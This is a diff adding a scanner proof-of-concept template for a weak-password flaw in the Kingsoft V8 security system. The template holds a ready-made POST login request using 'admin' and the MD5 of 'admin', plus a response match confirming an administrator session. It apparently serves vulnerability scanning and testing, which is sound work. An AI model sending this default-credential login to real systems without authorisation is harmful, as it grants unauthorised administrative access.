@@ -1,0 +1,20 @@
+id: poc-yaml-kingsoft-v8-weak-pass
+info:
+  name: Kingsoft V8 安全系统弱密码漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: Kingsoft
+  osprey-id: vb_2021_0018
+requests:
+- method: POST
+  path: /inter/ajax.php?cmd=get_user_login_cmd
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  data: "{\"get_user_login_cmd\":{\"name\":\"admin\",\"password\":\"21232f297a57a5a743894a0e4a801fc3\"\
+    }}      \n"
+  expression: 'contains(body, "ADMIN") && contains(body, "userSession")
+
+    '
+variables: {}
+transport: http
